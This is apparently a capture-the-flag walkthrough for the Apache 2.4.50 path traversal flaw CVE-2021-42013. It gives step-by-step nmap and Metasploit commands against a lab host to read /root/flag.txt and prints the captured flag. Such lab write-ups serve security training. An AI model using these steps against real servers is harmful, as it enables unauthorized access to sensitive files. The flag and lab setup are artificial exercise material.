# Vulnerability Exploitation Report: CVE-2021-42013

## Vulnerability Overview
**CVE ID**: CVE-2021-42013  
**CVSS Score**: 9.8 (Critical)  
**Description**: A path traversal vulnerability in Apache HTTP Server (version 2.4.50) allows unauthenticated attackers to access arbitrary files outside the web root directory by crafting malicious requests. This critical flaw can lead to unauthorized access to sensitive files on the server.

## Objective
Exploit the CVE-2021-42013 path traversal vulnerability on a target Apache HTTP Server to read the `/root/flag.txt` file as part of a capture-the-flag (CTF) challenge.

## Target Information
- **Target IP**: 192.168.5.4
- **Target Port**: 80 (HTTP)
- **Attack Machine IP**: 192.168.0.5
- **Objective**: Retrieve the contents of `/root/flag.txt`

## Exploitation Steps

### Step 1: Network Discovery
Perform a ping scan to identify active hosts in the 192.168.5.0/24 subnet.

```
nmap -sn 192.168.5.0/24
```

### Step 2: Service Enumeration
Enumerate services on the target host (192.168.5.4) to confirm the presence of Apache HTTP Server.

```
nmap -sV 192.168.5.4
```

### Step 3: Launch Metasploit
Start the Metasploit Framework to access exploit modules.

```
msfconsole
```

### Step 4: Search for Apache Exploit
Search Metasploit for modules related to Apache HTTP Server version 2.4.50.

```
search apache 2.4.50
```

### Step 5: Select Path Traversal Module
Choose the Metasploit module for the Apache path traversal vulnerability.

```
use auxiliary/scanner/http/apache_normalize_path
```

### Step 6: Review Module Details
Display information about the selected module to understand its options and requirements.

```
info
```

### Step 7: Configure the Target Host
Set the target host to the Apache serverâ€™s IP address.

```
set RHOSTS 192.168.5.4
```

### Step 8: Configure the Target Port
Set the target port to 80 for HTTP communication.

```
set RPORT 80
```

### Step 9: Disable SSL
Configure the module to use HTTP instead of HTTPS.

```
set SSL false
```

### Step 10: Specify File to Read
Set the file path to the target file `/root/flag.txt`.

```
set FILEPATH /root/flag.txt
```

### Step 11: Set Action to Read File
Configure the module to perform a file read operation.

```
set action READ_FILE
```

### Step 12: Execute the Exploit
Run the exploit to attempt to read the specified file via the path traversal vulnerability.

```
exploit
```

### Step 13: Exit Metasploit
Exit the Metasploit console after the exploit completes.

```
exit
```

### Step 14: Retrieve the Loot
Access the file retrieved by Metasploit from the local loot directory.

```
cat /root/.msf4/loot/{fname}.bin
```

## Final Result
The exploitation was successful, and the flag was retrieved from the target system.

**Flag**: tGEsSPrGsbWunrAD